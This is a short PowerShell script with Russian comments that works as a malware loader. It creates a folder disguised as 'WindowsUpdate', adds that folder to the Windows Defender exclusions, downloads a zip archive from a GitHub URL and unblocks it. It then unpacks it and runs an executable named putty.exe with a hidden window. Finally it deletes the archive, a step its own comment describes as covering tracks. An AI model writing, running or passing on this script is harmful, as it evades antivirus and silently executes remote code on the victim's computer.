# 1. Настройка путей
$dir = "$env:USERPROFILE\Documents\WindowsUpdate"
$url = "https://github.com/mahmed9203/under888/raw/refs/heads/main/222.zip"
$zip = "$dir\update.zip"
$exe = "$dir\putty.exe"

# 2. Создаем рабочую папку
if (!(Test-Path $dir)) { 
    New-Item -ItemType Directory -Path $dir -Force | Out-Null 
}

# 3. Добавление папки в исключения Defender (требует прав админа)
# Если прав нет, скрипт просто пойдет дальше
ErrorActionPreference = 'SilentlyContinue'
Add-MpPreference -ExclusionPath $dir

# 4. Скачивание (используем современный метод через WebClient)
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $zip)

# 5. Разблокировка и распаковка
Unblock-File -Path $zip
Expand-Archive -Path $zip -DestinationPath $dir -Force
Get-ChildItem -Path $dir -Recurse | Unblock-File

# 6. Скрытый запуск
if (Test-Path $exe) {
    Start-Process -FilePath $exe -WorkingDirectory $dir -WindowStyle Hidden
}

# 7. Заметаем следы (удаляем ZIP)
Remove-Item -Path $zip -Force
